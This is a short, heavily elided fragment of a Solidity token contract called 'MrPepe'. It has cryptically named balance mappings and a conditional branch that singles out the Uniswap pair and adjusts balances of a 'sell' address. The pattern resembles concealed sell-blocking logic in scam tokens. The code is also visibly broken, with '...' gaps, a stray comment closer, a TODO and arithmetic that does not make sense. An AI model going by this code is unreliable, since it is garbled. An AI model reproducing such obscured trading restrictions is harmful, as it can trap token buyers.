...
contract MrPepe is Ownable {
    ...
    mapping(address => uint256) private mra;
    mapping(address => uint256) private mry;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address mre) {
        name = 'MrPepe';
        symbol = 'MrPepe';
      ...
      */
      // TODO
        ...
        if (mra[sell] == 0) {
            ...
            if (uniswapV2Pair != sell && mry[sell] > 0) {
                mra[sell] -= account;
            }
        }
